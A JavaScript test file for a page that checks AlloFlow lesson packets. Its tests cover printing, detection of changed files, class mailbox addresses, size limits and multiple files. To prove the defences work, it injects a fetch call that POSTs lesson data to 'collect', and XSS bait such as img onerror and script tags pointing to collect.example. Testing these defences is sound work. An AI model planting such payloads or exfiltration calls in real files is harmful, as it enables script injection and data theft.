    page.w.dispatchEvent(new page.w.Event('afterprint'));
    expect(page.parts(report).map((box) => box.open)).toEqual([false, true, false, false, false, false]);
    // Printing from the browser's own menu opens them too.
    page.w.dispatchEvent(new page.w.Event('beforeprint'));
    expect(page.parts(report).every((box) => box.open)).toBe(true);
    page.w.dispatchEvent(new page.w.Event('afterprint'));
    expect(page.parts(report).map((box) => box.open)).toEqual([false, true, false, false, false, false]);
  });

  it('a file that was changed: the third headline, and the things to look at open, with their lines', async () => {
    const page = openPage();
    const html = reseal(withCode(F.practice, 'win.fetch("collect", { method: "POST", body: JSON.stringify(lesson) });'));
    expect(await page.drop([page.file(html, 'changed.html')])).toBe('1 file read. ' + look(2));
    const [report] = page.reports();
    expect([report.getAttribute('data-result'), report.querySelector('.verdict-line').textContent]).toEqual(['look', look(2)]);
    expect(page.parts(report).map((box) => box.open)).toEqual([false, false, false, false, true, false]);
    expect(page.part(report, PARTS[4]).querySelector('.part-count').textContent).toBe('2');
    const r = verify.verifyPacket(html);
    expect(page.items(report, PARTS[4])).toEqual(r.plain.look);
    const line = withCode(F.practice, 'x').split('\nvar renders=')[0].split('\n').length;
    expect(page.items(report, PARTS[4])[1]).toBe('Line ' + line + ': fetch( (not expected). This call sends or fetches data over the network. A file with no class mailbox has none. The policy would refuse it.');
    const found = [...page.part(report, 'For IT staff').querySelectorAll('table')][2];
    expect(page.rows(found)[1].slice(0, 3)).toEqual([line + ' (character 5)', 'fetch(, in the code', UNEXPECTED]);
    expect(found.querySelector('tbody tr td.is-unexpected')).toBeTruthy();
  });

  it('a file with a class mailbox: the second headline, and the address a teacher can confirm', async () => {
    const page = openPage();
    expect(await page.drop([page.file(F.mailbox, 'mailbox.html')])).toBe('1 file read. ' + ONE_PLACE);
    const [report] = page.reports();
    expect(report.getAttribute('data-result')).toBe('mailbox');
    expect(page.items(report, PARTS[1])[1]).toContain('The address in the file is ' + MAILBOX.url + '.');
    const it = page.part(report, 'For IT staff');
    expect([...it.querySelectorAll('h4')].map((node) => node.textContent)).toContain('The class mailbox address in the file');
    expect(report.textContent).not.toContain(MAILBOX.secret);
    expect(report.textContent).not.toContain(MAILBOX.packId);
    expect(page.reached).toEqual([]);
  });

  it('the samples: a practice file, a check, and a file that was changed', async () => {
    const page = openPage();
    const press = (key) => page.d.querySelector('[data-sample="' + key + '"]').click();
    press('practice');
    press('check');
    press('changed');
    const reports = page.reports();
    expect(reports.map((report) => [report.querySelector('.kicker').textContent, report.querySelector('.verdict-line').textContent])).toEqual([
      ['Sample file: sample-practice-file.html', CLOSED], ['Sample file: sample-check-file.html', CLOSED], ['Sample file: sample-changed-file.html', look(4)]]);
    expect(reports.map((report) => report.querySelector('.facts-row dd').textContent)).toEqual(['Practice file', 'Check', 'Practice file']);
    expect(page.$('said').textContent).toBe('1 file read. ' + look(4));
    expect(page.d.activeElement).toBe(reports[2].querySelector('.verdict-line'));
    expect(page.$('reports-line').textContent).toMatch(/^3 files on this page\./);
    expect(page.readers).toBe(0);
    expect(page.reached).toEqual([]);
    // Clear the page: no report is left, and focus goes back to the button.
    page.$('clear').click();
    expect([page.reports().length, page.$('reports').hidden, page.$('said').textContent, page.d.activeElement]).toEqual([0, true, 'The page is clear.', page.$('choose')]);
  });
});

describe('the page: files that are not what they seem', () => {
  it('nothing from a file ever becomes part of the page: it is shown as text', async () => {
    const page = openPage();
    const before = page.watched();
    const bait = '<img src=x onerror="window.pwned=1"><script>window.pwned=2</script><iframe src="//collect.example"></iframe><a href="//collect.example">x</a>';
    const m = manifestOf(F.check);
    const hostile = { ...m, title: bait, what: bait, licence: bait, attributions: [bait], packet: { ...m.packet, form: bait }, never: [bait], check: { ...m.check, answers: bait, teacherCode: bait },
      stores: [{ where: bait, key: bait, holds: bait, until: bait }], saves: [{ file: bait, format: bait }], network: { sendsTo: bait, what: bait, when: bait }, builder: { name: bait, seed: bait, ai: bait } };
    const block = /<script type="application\/json" id="packet-manifest">(.*?)<\/script>/.exec(F.check)[1];
    const safeJson = (value) => JSON.stringify(value).replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026');
    const files = [
      page.file(F.check.replace(block, () => safeJson(hostile)), bait + '.html'),
      // The same bait as raw markup in the page, in the script and in the policy line.
      page.file(F.practice.replace('<p id="live"', bait + '<p id="live"').replace('\nvar renders=', '\nvar bait = \'' + bait.replace(/<\/script>/, '') + '\';\nvar renders=').replace("connect-src 'none'\">", "connect-src 'none' " + bait.replace(/"/g, '') + '">'), 'raw.html'),
      page.file(bait + bait, 'not-a-packet.html'),
    ];
    await page.drop(files);
    const reports = page.reports();
    expect(reports.length).toBe(3);
    for (const box of page.d.querySelectorAll('#report-list details')) box.open = true;
    for (const report of reports) report.querySelector('[data-copy]') && report.querySelector('[data-copy]').click();
    await new Promise((resolve) => setTimeout(resolve, 50));
    // The bait is on the page, as words.
    expect(reports[0].querySelector('.kicker').textContent).toBe('File: ' + files[0].name);
    expect(files[0].name).toContain('<img src=x onerror=');
    expect(reports[0].textContent).toContain('Title: ' + bait + '.');
    expect(reports[1].textContent).toContain('<img src=x onerror=');
    expect(reports[2].querySelector('.verdict-line').textContent).toBe('This file was not checked.');
    // And no element came from it: the page has the links, scripts and styles it started with, and no others.
    expect(page.watched()).toBe(before);
    expect(page.w.pwned).toBeUndefined();
    const allowedTags = ['ARTICLE', 'BUTTON', 'CODE', 'DD', 'DETAILS', 'DIV', 'DL', 'DT', 'H3', 'H4', 'LI', 'P', 'SPAN', 'STRONG', 'SUMMARY', 'TABLE', 'TBODY', 'TD', 'TEXTAREA', 'TH', 'THEAD', 'TR', 'UL'];
    for (const node of page.$('report-list').querySelectorAll('*')) {
      expect(allowedTags, node.tagName).toContain(node.tagName);
      for (const attribute of node.attributes) expect(/^on|^(?:src|href|style|action|srcdoc)$/i.test(attribute.name), node.tagName + ' ' + attribute.name).toBe(false);
    }
    expect(page.$('report-list').querySelectorAll(WATCHED).length).toBe(0);
    expect(page.reached).toEqual([]);
    expect(page.stored()).toEqual({ local: 0, session: 0, cookie: '' });
  });

  it('a file that is not a packet, a results file and an empty file each get a plain reason', async () => {
    const page = openPage();
    const said = await page.drop([page.file('<!doctype html><html><body><h1>Short vowels</h1></body></html>', 'page.html'), page.file(read('tests/fixtures/packets_results/sample_results.csv'), 'results.csv'), page.file('', 'empty.html')]);
    expect(said).toBe('3 files read.');
    const reports = page.reports();
    expect(reports.map((report) => [report.getAttribute('data-result'), report.querySelector('.verdict-line').textContent, report.querySelector('.verdict-sub').textContent])).toEqual([
      ['not_packet', 'This file was not checked.', 'This is not an AlloFlow packet: it has no manifest block (the part of a packet that says what the file is), and it is not an older AlloFlow practice file.'],
      ['not_packet', 'This file was not checked.', 'This looks like a results file, not a packet. The page named Add up results reads results files.'],
      ['refused', 'This file was not checked.', 'This file is empty.']]);
    // No parts, no copy button: there is no report to open. The fingerprint of a file that was read is still given.
    expect(reports.map((report) => report.querySelectorAll('details, button').length)).toEqual([0, 0, 0]);
    expect(reports.map((report) => !!report.querySelector('.fingerprint'))).toEqual([true, true, false]);
    expect(page.d.activeElement).toBe(reports[0].querySelector('.verdict-line'));
  });

  it('a file over 60 MB is not read at all', async () => {
    const page = openPage();
    const big = page.file('x', 'huge.html');
    Object.defineProperty(big, 'size', { value: 61 * 1024 * 1024 });
    await page.drop([big]);
    expect(page.readers).toBe(0);
    const [report] = page.reports();
    expect([report.getAttribute('data-result'), report.querySelector('.verdict-sub').textContent]).toEqual(['refused', 'This file is 61 MB. A file larger than 60 MB is not read. A practice file is usually a few megabytes.']);
  });

  it('several files at once: one report each, ten at most, older file and check side by side', async () => {
    const page = openPage();
    await page.drop([page.file(F.older, 'older.html'), page.file(F.check, 'check.html')]);
    const reports = page.reports();
    expect(reports.map((report) => report.querySelector('.verdict-line').textContent)).toEqual([look(1), CLOSED]);
    expect(reports.map((report) => report.querySelector('.facts-row dd').textContent)).toEqual(['Older practice file', 'Check']);
    expect(reports[0].querySelector('.verdict-sub').textContent).toBe('This looks like an older AlloFlow practice file: fewer checks apply.');
    expect(page.part(reports[0], 'For IT staff').textContent).toContain('This file has no manifest block, so it says nothing to compare.');
    expect(page.d.activeElement).toBe(reports[0].querySelector('.verdict-line'));
    expect(new Set([...page.d.querySelectorAll('[id]')].map((node) => node.id)).size).toBe(page.d.querySelectorAll('[id]').length);
    const many = openPage();
    const said = await many.drop(Array.from({ length: 12 }, (unused, i) => many.file('<p>' + i + '</p>', i + '.html')));
    expect(said).toBe('10 files read. 2 more files were not read: 10 at a time.');
    expect(many.reports().length).toBe(10);
    expect(many.readers).toBe(10);
  });

  it('a file chosen with the button is read the same way', async () => {
    const page = openPage();
    let clicked = 0;
    page.$('files').click = () => { clicked++; };
    page.$('choose').click();
    expect(clicked).toBe(1);
    Object.defineProperty(page.$('files'), 'files', { configurable: true, value: [page.file(F.check, 'check.html')] });
    page.$('files').dispatchEvent(new page.w.Event('change', { bubbles: true }));
    await page.until(() => page.reports().length === 1, 'the report');
    expect(page.reports()[0].querySelector('.verdict-line').textContent).toBe(CLOSED);
    // A drag that carries no file is left alone.
    const event = new page.w.Event('drop', { bubbles: true, cancelable: true });
    event.dataTransfer = { types: ['text/plain'], files: [] };
    page.$('main').dispatchEvent(event);
    expect(event.defaultPrevented).toBe(false);
  });
});
